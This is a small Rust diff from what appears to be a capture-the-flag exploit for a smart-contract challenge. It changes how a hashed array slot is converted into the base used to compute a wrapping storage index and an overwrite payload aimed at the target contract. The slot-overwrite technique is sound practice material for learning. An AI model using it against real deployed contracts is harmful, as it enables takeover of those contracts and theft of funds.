@@ -54,7 +54,7 @@ impl ctf::Exploit for Exploit {
             );
         }
 
-        let base = U256::try_from(keccak256(array_slot.to_be_bytes_vec()))?;
+        let base: U256 = keccak256(array_slot.to_be_bytes_vec()).into();
         let i = -base;
         let before = target.codex(i).call().await?;
         let payload = B256::left_padding_from(offender.address().as_slice());
